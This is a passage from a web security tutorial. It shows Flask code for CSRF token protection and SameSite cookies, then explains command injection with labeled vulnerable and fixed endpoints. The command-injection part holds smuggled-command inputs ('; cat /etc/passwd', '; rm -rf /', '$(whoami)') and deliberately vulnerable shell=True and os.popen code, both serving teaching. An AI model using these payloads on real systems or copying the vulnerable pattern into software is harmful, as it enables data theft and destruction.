â”‚<span class="w">  </span>â””â”€â”€â”€â”€â”€â”€â”˜<span class="w">    </span>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<span class="w">    </span>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<span class="w">                      </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>Why<span class="w"> </span>it<span class="w"> </span>works:<span class="w">                                                   </span>â”‚
â”‚<span class="w">  </span>-<span class="w"> </span>Browsers<span class="w"> </span>automatically<span class="w"> </span>send<span class="w"> </span>cookies<span class="w"> </span>with<span class="w"> </span>every<span class="w"> </span>request<span class="w">       </span>â”‚
â”‚<span class="w">  </span>-<span class="w"> </span>The<span class="w"> </span>server<span class="w"> </span>can&#39;t<span class="w"> </span>distinguish<span class="w"> </span>user-initiated<span class="w"> </span>vs<span class="w"> </span>forged<span class="w">        </span>â”‚
â”‚<span class="w">    </span>requests<span class="w"> </span>(both<span class="w"> </span>have<span class="w"> </span>valid<span class="w"> </span>cookies)<span class="w">                            </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<h3 id="42-csrf-prevention">4.2 CSRF Prevention<a class="header-link" href="#42-csrf-prevention" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">csrf_prevention.py - CSRF protection implementation</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">secrets</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">abort</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">functools</span><span class="w"> </span><span class="kn">import</span> <span class="n">wraps</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_hex</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># Method 1: Synchronizer Token Pattern</span>
<span class="c1"># ==============================================================</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_csrf_token</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Generate a CSRF token and store in session.&quot;&quot;&quot;</span>
    <span class="k">if</span> <span class="s1">&#39;csrf_token&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_hex</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">]</span>


<span class="c1"># Make csrf_token available in all templates</span>
<span class="n">app</span><span class="o">.</span><span class="n">jinja_env</span><span class="o">.</span><span class="n">globals</span><span class="p">[</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">generate_csrf_token</span>


<span class="k">def</span><span class="w"> </span><span class="nf">csrf_protect</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Decorator to enforce CSRF token validation.&quot;&quot;&quot;</span>
    <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">decorated</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;PUT&#39;</span><span class="p">,</span> <span class="s1">&#39;DELETE&#39;</span><span class="p">,</span> <span class="s1">&#39;PATCH&#39;</span><span class="p">):</span>
            <span class="c1"># Check token in form data or header</span>
            <span class="n">token</span> <span class="o">=</span> <span class="p">(</span>
                <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">)</span> <span class="ow">or</span>
                <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;X-CSRF-Token&#39;</span><span class="p">)</span>
            <span class="p">)</span>
            <span class="n">expected</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">)</span>

            <span class="k">if</span> <span class="ow">not</span> <span class="n">token</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">expected</span><span class="p">:</span>
                <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s2">&quot;CSRF token missing&quot;</span><span class="p">)</span>

            <span class="c1"># Constant-time comparison to prevent timing attacks</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">hmac</span><span class="o">.</span><span class="n">compare_digest</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">expected</span><span class="p">):</span>
                <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s2">&quot;CSRF token invalid&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">decorated</span>


<span class="c1"># Usage in templates:</span>
<span class="n">TRANSFER_FORM</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;</span>
<span class="s2">&lt;body&gt;</span>
<span class="s2">    &lt;h1&gt;Transfer Money&lt;/h1&gt;</span>
<span class="s2">    &lt;form method=&quot;POST&quot; action=&quot;/transfer&quot;&gt;</span>
<span class="s2">        &lt;!-- CSRF token as hidden field --&gt;</span>
<span class="s2">        &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;{{ csrf_token() }}&quot;&gt;</span>
<span class="s2">        &lt;label&gt;To: &lt;input type=&quot;text&quot; name=&quot;to&quot;&gt;&lt;/label&gt;</span>
<span class="s2">        &lt;label&gt;Amount: &lt;input type=&quot;number&quot; name=&quot;amount&quot;&gt;&lt;/label&gt;</span>
<span class="s2">        &lt;button type=&quot;submit&quot;&gt;Transfer&lt;/button&gt;</span>
<span class="s2">    &lt;/form&gt;</span>
<span class="s2">&lt;/body&gt;</span>
<span class="s2">&lt;/html&gt;</span>
<span class="s2">&quot;&quot;&quot;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/transfer&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="nd">@csrf_protect</span>
<span class="k">def</span><span class="w"> </span><span class="nf">transfer</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">TRANSFER_FORM</span><span class="p">)</span>

    <span class="c1"># POST - CSRF token has been validated by decorator</span>
    <span class="n">to</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;to&#39;</span><span class="p">)</span>
    <span class="n">amount</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;amount&#39;</span><span class="p">)</span>
    <span class="c1"># Process transfer...</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;transferred&quot;</span><span class="p">})</span>


<span class="c1"># For AJAX requests, include the token in a header:</span>
<span class="n">AJAX_EXAMPLE</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;script&gt;</span>
<span class="s2">// Get token from meta tag or cookie</span>
<span class="s2">var csrfToken = document.querySelector(&#39;meta[name=&quot;csrf-token&quot;]&#39;).content;</span>

<span class="s2">fetch(&#39;/api/transfer&#39;, {</span>
<span class="s2">    method: &#39;POST&#39;,</span>
<span class="s2">    headers: {</span>
<span class="s2">        &#39;Content-Type&#39;: &#39;application/json&#39;,</span>
<span class="s2">        &#39;X-CSRF-Token&#39;: csrfToken  // Send token in header</span>
<span class="s2">    },</span>
<span class="s2">    body: JSON.stringify({to: &#39;bob&#39;, amount: 100})</span>
<span class="s2">});</span>
<span class="s2">&lt;/script&gt;</span>
<span class="s2">&quot;&quot;&quot;</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># Method 2: SameSite Cookie (Defense-in-depth)</span>
<span class="c1"># ==============================================================</span>

<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">update</span><span class="p">(</span>
    <span class="n">SESSION_COOKIE_SAMESITE</span><span class="o">=</span><span class="s1">&#39;Lax&#39;</span><span class="p">,</span>   <span class="c1"># Don&#39;t send cookie on cross-site POST</span>
    <span class="n">SESSION_COOKIE_SECURE</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>       <span class="c1"># HTTPS only</span>
    <span class="n">SESSION_COOKIE_HTTPONLY</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>      <span class="c1"># No JavaScript access</span>
<span class="p">)</span>

<span class="c1"># SameSite values:</span>
<span class="c1"># &#39;Strict&#39; - Cookie never sent on cross-site requests</span>
<span class="c1">#            (breaks &quot;login with Google&quot; type flows)</span>
<span class="c1"># &#39;Lax&#39;    - Cookie sent on top-level GET navigations, but NOT on</span>
<span class="c1">#            cross-site POST/PUT/DELETE (recommended default)</span>
<span class="c1"># &#39;None&#39;   - Cookie always sent (requires Secure flag)</span>
<span class="c1">#            (needed for cross-site authenticated requests)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># Method 3: Double Submit Cookie</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/transfer&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">api_transfer</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Double Submit Cookie pattern:</span>
<span class="sd">    1. Server sets a random value in a cookie</span>
<span class="sd">    2. Client must send the same value in a header</span>
<span class="sd">    3. Attacker can&#39;t read the cookie value (same-origin policy)</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">cookie_token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">)</span>
    <span class="n">header_token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;X-CSRF-Token&#39;</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">cookie_token</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">header_token</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;CSRF token missing&quot;</span><span class="p">}),</span> <span class="mi">403</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">hmac</span><span class="o">.</span><span class="n">compare_digest</span><span class="p">(</span><span class="n">cookie_token</span><span class="p">,</span> <span class="n">header_token</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;CSRF token mismatch&quot;</span><span class="p">}),</span> <span class="mi">403</span>

    <span class="c1"># Process the request...</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;success&quot;</span><span class="p">})</span>
</code></pre></div>

<h3 id="43-csrf-prevention-summary">4.3 CSRF Prevention Summary<a class="header-link" href="#43-csrf-prevention-summary" title="Permanent link">&para;</a></h3>
<table>
<thead>
<tr>
<th>Method</th>
<th>How It Works</th>
<th>Pros</th>
<th>Cons</th>
</tr>
</thead>
<tbody>
<tr>
<td>Synchronizer Token</td>
<td>Random token in session + form</td>
<td>Strong, widely supported</td>
<td>Requires server-side session</td>
</tr>
<tr>
<td>SameSite Cookie</td>
<td>Browser blocks cross-site cookies</td>
<td>Simple, no code changes</td>
<td>Old browser support, only defense-in-depth</td>
</tr>
<tr>
<td>Double Submit Cookie</td>
<td>Token in cookie + header must match</td>
<td>Stateless</td>
<td>Vulnerable if subdomain is compromised</td>
</tr>
<tr>
<td>Custom Header</td>
<td>Custom header required (e.g., X-Requested-With)</td>
<td>Simple for AJAX</td>
<td>Only works for AJAX requests</td>
</tr>
<tr>
<td>Origin/Referer Check</td>
<td>Verify request origin matches expected</td>
<td>Defense-in-depth</td>
<td>Can be stripped by proxies</td>
</tr>
</tbody>
</table>
<hr />
<h2 id="5-command-injection">5. Command Injection<a class="header-link" href="#5-command-injection" title="Permanent link">&para;</a></h2>
<h3 id="51-how-command-injection-works">5.1 How Command Injection Works<a class="header-link" href="#51-how-command-injection-works" title="Permanent link">&para;</a></h3>
<p>Command injection occurs when an application passes user input to a system shell command. The attacker can append additional commands using shell metacharacters.</p>
<div class="highlight"><pre><span></span><code><span class="n">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="n">â”‚</span><span class="w">              </span><span class="n">Command</span><span class="w"> </span><span class="n">Injection</span><span class="w">                                   </span><span class="n">â”‚</span>
<span class="n">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">Application</span><span class="w"> </span><span class="n">intends</span><span class="o">:</span><span class="w">                                            </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ping</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="w">                                            </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">Attacker</span><span class="w"> </span><span class="n">provides</span><span class="o">:</span><span class="w">                                              </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="p">;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">                                     </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">Executed</span><span class="w"> </span><span class="n">command</span><span class="o">:</span><span class="w">                                               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ping</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="p">;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">                          </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><span class="w">  </span><span class="n">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><span class="w">                       </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">intended</span><span class="w"> </span><span class="n">command</span><span class="w">        </span><span class="n">injected</span><span class="w"> </span><span class="n">command</span><span class="w">                        </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">Shell</span><span class="w"> </span><span class="n">Metacharacters</span><span class="o">:</span><span class="w">                                           </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="p">;</span><span class="w">    </span><span class="n">â†’</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="k">separator</span><span class="w"> </span><span class="p">(</span><span class="n">run</span><span class="w"> </span><span class="k">both</span><span class="w"> </span><span class="n">commands</span><span class="p">)</span><span class="w">                   </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">&amp;&amp;</span><span class="w">   </span><span class="n">â†’</span><span class="w"> </span><span class="n">Run</span><span class="w"> </span><span class="k">second</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="k">first</span><span class="w"> </span><span class="n">succeeds</span><span class="w">                    </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">||</span><span class="w">   </span><span class="n">â†’</span><span class="w"> </span><span class="n">Run</span><span class="w"> </span><span class="k">second</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="k">first</span><span class="w"> </span><span class="n">fails</span><span class="w">                       </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">|</span><span class="w">    </span><span class="n">â†’</span><span class="w"> </span><span class="n">Pipe</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">next</span><span class="w"> </span><span class="n">command</span><span class="w">                             </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n n-Quoted">`cmd`</span><span class="n">â†’</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="n">substitution</span><span class="w"> </span><span class="p">(</span><span class="n">backticks</span><span class="p">)</span><span class="w">                        </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">$</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="n">â†’</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="n">substitution</span><span class="w">                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">&gt;</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">â†’</span><span class="w"> </span><span class="n">Redirect</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">file</span><span class="w">                               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="o">&lt;</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">â†’</span><span class="w"> </span><span class="k">Read</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">file</span><span class="w">                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<h3 id="52-vulnerable-and-fixed-code">5.2 Vulnerable and Fixed Code<a class="header-link" href="#52-vulnerable-and-fixed-code" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">command_injection.py - Command injection vulnerability and prevention</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">shlex</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># VULNERABLE: os.system with user input</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ping-vulnerable&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ping_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;VULNERABLE: Command injection via os.system.&quot;&quot;&quot;</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span>

    <span class="c1"># NEVER DO THIS</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ping -c 4 </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;output&quot;</span><span class="p">:</span> <span class="n">result</span><span class="p">})</span>

<span class="c1"># Attack: {&quot;host&quot;: &quot;google.com; cat /etc/passwd&quot;}</span>
<span class="c1"># Attack: {&quot;host&quot;: &quot;google.com; rm -rf /&quot;}</span>
<span class="c1"># Attack: {&quot;host&quot;: &quot;$(whoami)&quot;}</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/lookup-vulnerable&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">lookup_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;VULNERABLE: Command injection via subprocess with shell=True.&quot;&quot;&quot;</span>
    <span class="n">domain</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;domain&#39;</span><span class="p">]</span>

    <span class="c1"># shell=True makes this vulnerable!</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;nslookup </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
        <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>  <span class="c1"># DANGEROUS: enables shell metacharacter processing</span>
        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
        <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;output&quot;</span><span class="p">:</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">})</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># FIXED: Multiple defense layers</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ping-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ping_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;FIXED: Safe command execution.&quot;&quot;&quot;</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;host&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># Defense 1: Input validation (whitelist)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9.\-]+$&#39;</span><span class="p">,</span> <span class="n">host</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid hostname&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># Defense 2: Length limit</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">host</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">253</span><span class="p">:</span>  <span class="c1"># Max DNS name length</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Hostname too long&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># Defense 3: Use subprocess with list arguments (no shell)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
            <span class="p">[</span><span class="s2">&quot;ping&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">,</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">],</span>  <span class="c1"># List form: NO shell interpretation</span>
            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
            <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>  <span class="c1"># Prevent hanging</span>
        <span class="p">)</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;output&quot;</span><span class="p">:</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">})</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Command timed out&quot;</span><span class="p">}),</span> <span class="mi">408</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/lookup-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">lookup_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;FIXED: Use library instead of shell command.&quot;&quot;&quot;</span>
    <span class="n">domain</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;domain&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># Defense 1: Input validation</span>
